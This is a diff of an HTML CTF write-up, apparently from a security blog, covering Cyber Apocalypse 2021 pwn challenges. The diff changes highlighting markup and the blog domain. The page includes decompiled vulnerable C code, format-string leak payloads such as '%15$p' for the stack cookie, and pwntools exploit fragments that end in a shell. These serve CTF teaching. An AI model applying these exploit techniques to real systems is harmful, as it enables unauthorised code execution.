+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>((<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)weapon);
 </span></span></code></pre></div><ul>
 <li><code>%3$p</code>: will leak a libc address, thereby bypassing libc ASLR</li>
 <li><code>%15$p</code>: will leak the stack cookie, thereby bypassing stack protection</li>
@@ -682,38 +681,38 @@ The ROP payload will then call this address.</p>
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">40</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-30h] BYREF
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span>[...]
-</span></span><span style="display:flex;"><span>printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] You found 1 </span><span style="color:#ae81ff">\u1F96</span><span style="color:#e6db74">7!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printstr</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] You found 1 </span><span style="color:#ae81ff">\u1F96</span><span style="color:#e6db74">7!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ( <span style="color:#f92672">++</span>pie <span style="color:#f92672">==</span> <span style="color:#ae81ff">22</span> )
 </span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;32m&#34;</span>);
-</span></span><span style="display:flex;"><span>  printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">You also notice that if the Harvester eats too many pies, it falls asleep.&#34;</span>);
-</span></span><span style="display:flex;"><span>  printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Do you want to feed it?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
-</span></span><span style="display:flex;"><span>  read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x40uLL</span>); <span style="color:#75715e">// Overflow !
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>);
-</span></span><span style="display:flex;"><span>  printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">This did not work as planned..</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;32m&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printstr</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">You also notice that if the Harvester eats too many pies, it falls asleep.&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printstr</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">Do you want to feed it?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x40uLL</span>); <span style="color:#75715e">// Overflow !
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printstr</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">This did not work as planned..</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>We do have a way to increment pies one by one using <code>stare</code>, but then the program will stop when reaching 16 pies:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">check_pie</span>(<span style="color:#66d9ef">int</span> pie)
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  [...]
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>  printf(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x1B</span><span style="color:#e6db74">[1;31m&#34;</span>);
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( pie <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0</span> )
 </span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    printstr(<span style="color:#f92672">&amp;</span>unk_1090);
-</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printstr</span>(<span style="color:#f92672">&amp;</span>unk_1090);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( pie <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span> <span style="color:#f92672">||</span> pie <span style="color:#f92672">==</span> <span style="color:#ae81ff">15</span> )
 </span></span><span style="display:flex;"><span>  {
-</span></span><span style="display:flex;"><span>    printstr(<span style="color:#f92672">&amp;</span>unk_10A4);
-</span></span><span style="display:flex;"><span>    exit(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printstr</span>(<span style="color:#f92672">&amp;</span>unk_10A4);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">exit</span>(<span style="color:#ae81ff">1</span>);
 </span></span><span style="display:flex;"><span>  }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>Once this requirement will be satisfied, everything will be ready to make an effective stack overflow, as we have libc addresses and the stack cookie.</p>
 <h4 id="stealing-pies">Stealing pies</h4>
 <p>The last function to use is <code>inventory</code>, which we can use to leave items from our stuff. However, we can specify a negative integer, which will cause the inventory to be incremented, and not decremented as planned.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>printstr(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">How many do you want to drop?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
-</span></span><span style="display:flex;"><span>__isoc99_scanf(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>v1);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printstr</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">How many do you want to drop?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%d&#34;</span>, <span style="color:#f92672">&amp;</span>v1);
 </span></span><span style="display:flex;"><span>pie <span style="color:#f92672">-=</span> v1;
 </span></span></code></pre></div><p>The exploit code:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;2&#39;</span>)
@@ -803,38 +802,38 @@ The ROP payload will then call this address.</p>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
 </span></span></code></pre></div><h2 id="save-the-environment---difficulty-24">Save the environment - Difficulty 2/4</h2>
-<p><em>Challenge files: <a href="https://thalium.github.io/blog/posts/binaries/Cyber_Apocalypse_2021/pwn_save_the_environment.zip">pwn_save_the_environment.zip</a></em></p>
+<p><em>Challenge files: <a href="https://blog.thalium.re/posts/binaries/Cyber_Apocalypse_2021/pwn_save_the_environment.zip">pwn_save_the_environment.zip</a></em></p>
 <p>The <code>environment</code> binary is an 64bits ELF that allows to plant or recycle.</p>
 <p>
-  <a href="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-environment.png" target="_blank">
-    <img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-environment.png" alt="fig_environment">
+  <a href="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-environment.png" target="_blank">
+    <img src="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-environment.png" alt="fig_environment">
   </a>
 </p>
 <p>Rapidly we view that the challenge is to exploit the binary and not to find bugs. Indeed the vulnerabilities are trivially discovered:</p>
 <ul>
 <li>A leak to <code>printf</code> inside the function <code>recycle-&gt;form</code> after 5 reclycle command</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>color(<span style="color:#e6db74">&#34;You have already recycled at least 5 times! Please accept this gift: &#34;</span>, <span style="color:#e6db74">&#34;magenta&#34;</span>);
-</span></span><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;[%p]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>printf);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">color</span>(<span style="color:#e6db74">&#34;You have already recycled at least 5 times! Please accept this gift: &#34;</span>, <span style="color:#e6db74">&#34;magenta&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[%p]</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#f92672">&amp;</span>printf);
 </span></span></code></pre></div><ul>
 <li>An arbitrary read inside the function <code>recycle-&gt;form</code> after 10 reclycle command</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>color(<span style="color:#e6db74">&#34;You have recycled 10 times! Feel free to ask me whatever you want.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>, <span style="color:#e6db74">&#34;cyan&#34;</span>);
-</span></span><span style="display:flex;"><span>read(<span style="color:#ae81ff">0</span>, nptr, <span style="color:#ae81ff">0x10uLL</span>);
-</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)strtoull(nptr, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>puts(s);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">color</span>(<span style="color:#e6db74">&#34;You have recycled 10 times! Feel free to ask me whatever you want.</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>, <span style="color:#e6db74">&#34;cyan&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, nptr, <span style="color:#ae81ff">0x10uLL</span>);
+</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">strtoull</span>(nptr, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">puts</span>(s);
 </span></span></code></pre></div><ul>
 <li>An arbitrary write inside the function <code>plant</code>, as already used in <a href="#minefield---difficulty-14">minefield</a></li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
-</span></span><span style="display:flex;"><span>read(<span style="color:#ae81ff">0</span>, buff, <span style="color:#ae81ff">0x10uLL</span>);
-</span></span><span style="display:flex;"><span>target_addr <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)strtoull(buff, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>putchar(<span style="color:#ae81ff">10</span>);
-</span></span><span style="display:flex;"><span>color(<span style="color:#e6db74">&#34;Where do you want to plant?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">1. City</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">2. Forest</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;green&#34;</span>);
-</span></span><span style="display:flex;"><span>printf(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
-</span></span><span style="display:flex;"><span>read(<span style="color:#ae81ff">0</span>, value, <span style="color:#ae81ff">0x10uLL</span>);
-</span></span><span style="display:flex;"><span>puts(<span style="color:#e6db74">&#34;Thanks a lot for your contribution!&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>target_addr <span style="color:#f92672">=</span> strtoull(target_value, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buff, <span style="color:#ae81ff">0x10uLL</span>);
+</span></span><span style="display:flex;"><span>target_addr <span style="color:#f92672">=</span> (_QWORD <span style="color:#f92672">*</span>)<span style="color:#a6e22e">strtoull</span>(buff, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">putchar</span>(<span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">color</span>(<span style="color:#e6db74">&#34;Where do you want to plant?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">1. City</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">2. Forest</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;green&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, value, <span style="color:#ae81ff">0x10uLL</span>);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Thanks a lot for your contribution!&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#f92672">*</span>target_addr <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoull</span>(target_value, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">0</span>);
 </span></span></code></pre></div><ul>
 <li>A win function <code>hidden_resources</code> at address <code>0x4010B5</code> to read the flag
 <ul>
@@ -918,16 +917,16 @@ The ROP payload will then call this address.</p>
 </span></span><span style="display:flex;"><span>    p<span style="color:#f92672">.</span>interactive()
 </span></span></code></pre></div><p>The exploit result:</p>
 <p>
-  <a href="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-environment_win.png" target="_blank">
-    <img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-environment_win.png" alt="fig_environment_win">
+  <a href="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-environment_win.png" target="_blank">
+    <img src="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-environment_win.png" alt="fig_environment_win">
   </a>
 </p>
 <h2 id="close-the-door---difficulty-24">Close the door - Difficulty 2/4</h2>
-<p><em>Challenge files: <a href="https://thalium.github.io/blog/posts/binaries/Cyber_Apocalypse_2021/misc_close_the_door.zip">misc_close_the_door.zip</a></em></p>
+<p><em>Challenge files: <a href="https://blog.thalium.re/posts/binaries/Cyber_Apocalypse_2021/misc_close_the_door.zip">misc_close_the_door.zip</a></em></p>
 <p><code>Close the door</code> is a <strong>64 bits ELF</strong>:</p>
 <p>
-  <a href="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-close_the_door.png" target="_blank">
-    <img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-close_the_door.png" alt="fig_close_the_door">
+  <a href="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-close_the_door.png" target="_blank">
+    <img src="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-close_the_door.png" alt="fig_close_the_door">
   </a>
 </p>
 <p>The libc used by the binary is provided with this challenge.</p>
@@ -950,27 +949,27 @@ The ROP payload will then call this address.</p>
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span>[...]
 </span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;Do you think this is the secret password?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>;
-</span></span><span style="display:flex;"><span>v6 <span style="color:#f92672">=</span> strlen(<span style="color:#e6db74">&#34;Do you think this is the secret password?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
+</span></span><span style="display:flex;"><span>v6 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#e6db74">&#34;Do you think this is the secret password?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>);
 </span></span><span style="display:flex;"><span>v5 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;At least we tried...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>;
-</span></span><span style="display:flex;"><span>v4 <span style="color:#f92672">=</span> strlen(<span style="color:#e6db74">&#34;At least we tried...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(<span style="color:#e6db74">&#34;At least we tried...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>[...]
-</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Do you think this is the secret password?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>, v6);
-</span></span><span style="display:flex;"><span>read(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x464uLL</span>);  <span style="color:#75715e">// Stack overflow !
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>write(<span style="color:#ae81ff">1</span>, v5, v4);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Do you think this is the secret password?</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&gt; &#34;</span>, v6);
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x464uLL</span>);  <span style="color:#75715e">// Stack overflow !
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, v5, v4);
 </span></span></code></pre></div><p>However, when overwriting the stack, one has to be cautious not to screw arguments used to perform the write just after:</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>strace .<span style="color:#f92672">/</span>close_the_door
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>read(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">42</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">42</span>
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;4&#34;</span>, <span style="color:#ae81ff">1</span>)                         <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>read(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;2&#34;</span>, <span style="color:#ae81ff">1</span>)                         <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>read(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>)                        <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
-</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;You found something interesting!&#34;</span>..., <span style="color:#ae81ff">33</span>You found something interesting<span style="color:#f92672">!</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;2&#34;</span>, <span style="color:#ae81ff">1</span>)                         <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">1</span>)                        <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;You found something interesting!&#34;</span>..., <span style="color:#ae81ff">33</span>You found something interesting<span style="color:#f92672">!</span>
 </span></span><span style="display:flex;"><span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">33</span>
-</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Do you think this is the secret &#34;</span>..., <span style="color:#ae81ff">44</span>Do you think this is the secret password<span style="color:#f92672">?</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;Do you think this is the secret &#34;</span>..., <span style="color:#ae81ff">44</span>Do you think this is the secret password<span style="color:#f92672">?</span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&gt;</span> ) <span style="color:#f92672">=</span> <span style="color:#ae81ff">44</span>
-</span></span><span style="display:flex;"><span>read(<span style="color:#ae81ff">0</span>, XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&#34;</span>..., <span style="color:#ae81ff">1124</span>) <span style="color:#f92672">=</span> <span style="color:#ae81ff">41</span>
-</span></span><span style="display:flex;"><span>write(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;SA</span><span style="color:#ae81ff">\211\375</span><span style="color:#e6db74">I</span><span style="color:#ae81ff">\211\366</span><span style="color:#e6db74">L)</span><span style="color:#ae81ff">\345</span><span style="color:#e6db74">H</span><span style="color:#ae81ff">\203\354\10</span><span style="color:#e6db74">H</span><span style="color:#ae81ff">\301\375\3\350\17\373\377\377</span><span style="color:#e6db74">H</span><span style="color:#ae81ff">\205\355</span><span style="color:#e6db74">t 1</span><span style="color:#ae81ff">\333\17\37</span><span style="color:#e6db74">&#34;</span>..., <span style="color:#ae81ff">1482184792</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> EFAULT (Bad address)
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">write</span>(<span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;SA</span><span style="color:#ae81ff">\211\375</span><span style="color:#e6db74">I</span><span style="color:#ae81ff">\211\366</span><span style="color:#e6db74">L)</span><span style="color:#ae81ff">\345</span><span style="color:#e6db74">H</span><span style="color:#ae81ff">\203\354\10</span><span style="color:#e6db74">H</span><span style="color:#ae81ff">\301\375\3\350\17\373\377\377</span><span style="color:#e6db74">H</span><span style="color:#ae81ff">\205\355</span><span style="color:#e6db74">t 1</span><span style="color:#ae81ff">\333\17\37</span><span style="color:#e6db74">&#34;</span>..., <span style="color:#ae81ff">1482184792</span>) <span style="color:#f92672">=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> <span style="color:#a6e22e">EFAULT</span> (Bad address)
 </span></span></code></pre></div><p>Both second and third arguments were overwritten by our <code>X</code>s slide, making the length goes wild, and pointing to an unexpected - yet valid - memory area.</p>
 <h3 id="exploit">Exploit</h3>
 <p>We will turn it into our advantage: we can give to the <code>write</code> function crafted arguments to leak us a libc address. Subsequent <code>read</code> allows us to inject the computed address of the one-gadget to get a shell.</p>
@@ -1028,8 +1027,8 @@ The ROP payload will then call this address.</p>
 </span></span><span style="display:flex;"><span>   p<span style="color:#f92672">.</span>interactive()
 </span></span></code></pre></div><p>We have a shell:</p>
 <p>
-  <a href="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-close_the_door_win.png" target="_blank">
-    <img src="https://thalium.github.io/blog/posts/img/Cyber_Apocalypse_2021-close_the_door_win.png" alt="fig_close_the_door_win">
+  <a href="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-close_the_door_win.png" target="_blank">
+    <img src="https://blog.thalium.re/posts/img/Cyber_Apocalypse_2021-close_the_door_win.png" alt="fig_close_the_door_win">
   </a>
 </p>
 <h2 id="conclusion">Conclusion</h2>
@@ -1219,15 +1218,15 @@ The ROP payload will then call this address.</p>
   
     
       <div class="tag">
-        <a href="https://thalium.github.io/blog/tags/ctf">#CTF</a>
+        <a href="https://blog.thalium.re/tags/ctf">#CTF</a>
       </div>
     
       <div class="tag">
-        <a href="https://thalium.github.io/blog/tags/writeup">#Writeup</a>
+        <a href="https://blog.thalium.re/tags/writeup">#Writeup</a>
       </div>
     
       <div class="tag">
-        <a href="https://thalium.github.io/blog/tags/cyberapocalypse2021">#CyberApocalypse2021</a>
+        <a href="https://blog.thalium.re/tags/cyberapocalypse2021">#CyberApocalypse2021</a>
       </div>
     
   
@@ -1270,7 +1269,7 @@ The ROP payload will then call this address.</p>
   
 
   <div class="social-link">
-  <a href="https://thalium.github.io/blog/index.xml" target="_blank">RSS</a>
+  <a href="https://blog.thalium.re/index.xml" target="_blank">RSS</a>
   </div>
 
 </div>
